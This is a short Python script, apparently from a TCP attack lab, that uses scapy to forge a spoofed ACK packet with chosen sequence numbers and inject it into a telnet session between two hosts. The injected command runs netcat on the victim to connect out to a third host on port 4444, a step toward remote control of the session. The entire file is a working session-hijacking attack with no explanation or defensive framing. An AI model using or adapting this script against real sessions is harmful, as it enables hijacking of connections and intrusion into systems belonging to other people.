import sys
from scapy.all import *

print("sending session hijacking packet...")
IPLayer = IP (src="10.10.10.185", dst = "10.10.10.184")
TCPLayer = TCP (sport=38854, dport=23, flags="A", seq=2128129068, ack=36811541)
Data ="\r nc 10.10.10.187 4444 \r"
pkt=IPLayer/TCPLayer/Data
ls(pkt)
send(pkt,verbose=0)
